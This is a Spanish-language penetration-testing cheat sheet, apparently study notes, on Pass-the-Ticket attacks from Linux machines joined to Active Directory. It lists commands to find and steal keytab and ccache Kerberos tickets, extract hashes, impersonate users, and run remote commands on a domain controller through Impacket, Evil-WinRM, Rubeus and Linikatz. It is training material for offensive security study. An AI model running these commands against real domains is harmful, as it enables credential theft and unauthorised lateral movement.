---
tags:
  - PTT
  - linux
  - AD
---
## Conceptos Clave (TL;DR)

* Un equipo Linux conectado a Active Directory comúnmente utiliza Kerberos para la autenticación.

* Las máquinas Linux almacenan los tickets de Kerberos principalmente de dos formas: como archivos `ccache` en el directorio `/tmp` (protegidos por permisos de lectura/escritura) o como archivos `keytab` (comúnmente usados en scripts).

* La ubicación predeterminada del ticket Kerberos activo se almacena en la variable de entorno `KRB5CCNAME`.

* Si comprometemos un equipo, podemos buscar y utilizar estos tickets para suplantar a otros usuarios (o a la cuenta de la máquina) y pivotar hacia otros recursos del dominio sin necesidad de conocer la contraseña en texto plano.

  
## Herramientas Clave

* **realm / sssd / winbind**: Para identificar si la máquina Linux está unida al dominio.

* **klist**: Interactúa con Kerberos en Linux para leer e imprimir información de archivos keytab o ccache.

* **kinit**: Permite interactuar con Kerberos para solicitar un TGT o importar un keytab a la sesión actual y actuar como el usuario.

* **KeyTabExtract**: Script en Python para extraer información valiosa (Realm, hashes NTLM/AES) de archivos .keytab.

* **Impacket (impacket-wmiexec / impacket-ticketConverter)**: Para ejecutar comandos de forma remota usando autenticación Kerberos o para convertir tickets de formato ccache a kirbi y viceversa.

* **Linikatz**: Herramienta análoga a Mimikatz para entornos UNIX que extrae automáticamente credenciales y tickets Kerberos (requiere ser root).

  
## Metodología Paso a Paso

1.  **Identificación de Integración con AD**: Determinar si la máquina pertenece al dominio revisando las configuraciones de `realm`, `sssd` o `winbind`.

2.  **Búsqueda de Tickets Kerberos**: Enumerar el sistema en busca de archivos `keytab` (usando comandos de búsqueda o revisando tareas programadas/cronjobs) y archivos `ccache` (en variables de entorno o revisando `/tmp`).

3.  **Abuso de Keytabs**: Si se encuentra un `keytab`, se puede importar usando `kinit` para suplantar la sesión Kerberos. Alternativamente, se pueden extraer sus hashes con `KeyTabExtract` para crackearlos o realizar Pass-the-Hash.

4.  **Abuso de archivos ccache**: Si se obtiene acceso root, se pueden copiar los archivos `ccache` de `/tmp` pertenecientes a usuarios privilegiados y exportar su ruta a la variable `KRB5CCNAME` para usarlos en la sesión de ataque.

5.  **Ejecución y Pivoting**: Con el ticket cargado, utilizar herramientas como SMBClient, Impacket o Evil-WinRM para acceder a servicios de red (como el Controlador de Dominio). Si se ataca desde fuera del dominio, configurar un túnel (ej. Chisel + Proxychains).


## Cheat Sheet de Comandos

### Identificación de AD en Linux
```bash
# Comprobar si la máquina Linux está unida al dominio usando realm
realm list
  

# Buscar procesos relacionados con la integración de AD si realm no está disponible
ps -ef | grep -i "winbind\|sssd"
```

### Búsqueda de Tickets Kerberos
```bash
# Buscar archivos con "keytab" en el nombre en todo el sistema omitiendo errores
find / -name *keytab* -ls 2>/dev/null

  
# Revisar tareas programadas que puedan contener scripts ejecutando Kerberos
crontab -l
  

# Revisar variables de entorno para identificar la ubicación del caché de credenciales
env | grep -i krb5

  
# Listar el contenido de /tmp buscando archivos ccache (usualmente empiezan por krb5cc_)
ls -la /tmp
```

### Abuso y Manipulación de Keytabs
```bash
# Leer información y listar el contenido de un archivo keytab
klist -k -t <RUTA_AL_ARCHIVO_KEYTAB>
 

# Importar el keytab a la sesión actual suplantando al usuario especificado
# IMPORTANTE: El nombre del dominio (<DOMAIN_UPPERCASE>) suele ser case-sensitive.
kinit <USER>@<DOMAIN_UPPERCASE> -k -t <RUTA_AL_ARCHIVO_KEYTAB>

  
# Extraer hashes (NTLM, AES) del archivo keytab
python3 keytabextract.py <RUTA_AL_ARCHIVO_KEYTAB>
```

### Abuso de Archivos ccache
```bash
# Copiar el archivo ccache objetivo al directorio actual
cp /tmp/<ARCHIVO_CCACHE> .

  
# Establecer la variable de entorno para usar el ticket copiado
export KRB5CCNAME=<RUTA_ABSOLUTA_AL_ARCHIVO_CCACHE_COPIADO>

  
# Verificar que el ticket ha sido cargado correctamente
klist
```

### Ejecución Remota y Proxies (Desde Host de Ataque)
```bash
# Modificar /etc/hosts en la máquina atacante para resolución de nombres
echo "<TARGET_DC_IP> <DOMAIN> <DC_HOSTNAME>.<DOMAIN> <DC_HOSTNAME>" >> /etc/hosts

  
# Autenticarse contra un recurso compartido SMB usando el ticket Kerberos activo
smbclient //<DC_HOSTNAME>/<SHARE> -k -c ls -no-pass

  
# Ejecutar comandos remotamente vía Impacket a través de Proxychains
proxychains impacket-wmiexec <DC_HOSTNAME> -k -no-pass
  

# Usar Evil-WinRM con Kerberos (requiere krb5-user instalado y /etc/krb5.conf configurado)
proxychains evil-winrm -i <DC_HOSTNAME> -r <DOMAIN>
```

### Conversión de Tickets y Herramientas Automatizadas
```bash
# Convertir un ticket ccache (Linux) a formato kirbi (Windows)
impacket-ticketConverter <ARCHIVO_CCACHE> <ARCHIVO_KIRBI_SALIDA>.kirbi
 

# Ejecutar Linikatz para extraer todos los tickets y credenciales automáticamente (requiere root)
./linikatz.sh
```

```powershell
# Importar un archivo kirbi convertido previamente usando Rubeus en Windows

Rubeus.exe ptt /ticket:<RUTA_AL_ARCHIVO_KIRBI>
```

  
## "Gotchas" y Troubleshooting

* **Permisos**: Para usar un archivo `keytab`, debes tener permisos de lectura y escritura sobre el archivo. Los archivos `ccache` en `/tmp` requieren permisos de lectura, por lo que a menudo necesitarás escalar privilegios a root para usarlos si pertenecen a otro usuario.

* **Sensibilidad a Mayúsculas/Minúsculas**: El comando `kinit` es case-sensitive. Asegúrate de usar el nombre del Principal exactamente como aparece en `klist` (generalmente, el nombre de usuario va en minúsculas y el dominio en mayúsculas).

* **Expiración de Tickets**: Los archivos `ccache` son temporales. Si los valores de "Valid starting" y "Expires" indican que la fecha de caducidad ha pasado, el ticket no funcionará.

* **Resolución de Nombres en Host de Ataque**: Para usar Kerberos desde un host de ataque externo, es obligatorio poder contactar al KDC/DC y que la resolución de nombres del dominio funcione correctamente. Deberás configurar un proxy (como Chisel) y modificar `/etc/hosts` con IPs hardcodeadas. Al usar herramientas de Impacket, especifica el nombre de la máquina objetivo, NO la dirección IP.

* **Prefijo FILE en Impacket**: Si usas herramientas Impacket desde un Linux en el dominio, recuerda que algunas implementaciones de AD usan el prefijo `FILE:` en la variable `KRB5CCNAME`. De ser así, debes modificar la variable para que solo contenga la ruta absoluta al archivo.

* **Requisito Evil-WinRM**: Para usar `evil-winrm` con Kerberos en Linux, debe estar instalado el paquete de red `krb5-user` (en Debian/Kali) y configurado el archivo `/etc/krb5.conf` con el Realm y KDC correspondiente.